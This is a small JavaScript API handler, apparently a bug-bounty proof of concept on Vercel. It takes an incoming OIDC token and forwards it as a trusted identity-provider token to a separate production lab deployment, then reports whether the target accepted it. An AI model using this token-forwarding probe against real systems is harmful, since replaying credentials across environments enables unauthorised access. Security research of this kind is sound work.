
export default async function handler(req, res) {
  const token = req.headers["x-vercel-oidc-token"];

  if (!token) {
    return res.status(401).json({
      error: "OIDC token unavailable",
      environment: process.env.VERCEL_ENV
    });
  }

  const target =
    "https://bb-vercel-lab-2026-git-main-hackerone-a-by-moraz.vercel.app/api/check";

  try {
    const response = await fetch(target, {
      headers: {
        "x-vercel-trusted-oidc-idp-token": token
      },
      redirect: "manual",
      cache: "no-store"
    });

    return res.status(200).json({
      caller_environment: process.env.VERCEL_ENV,
      target_environment: "production",
      target_status: response.status,
      location_present: Boolean(
        response.headers.get("location")
      )
    });
  } catch {
    return res.status(502).json({
      error: "Target request failed"
    });
  }
}
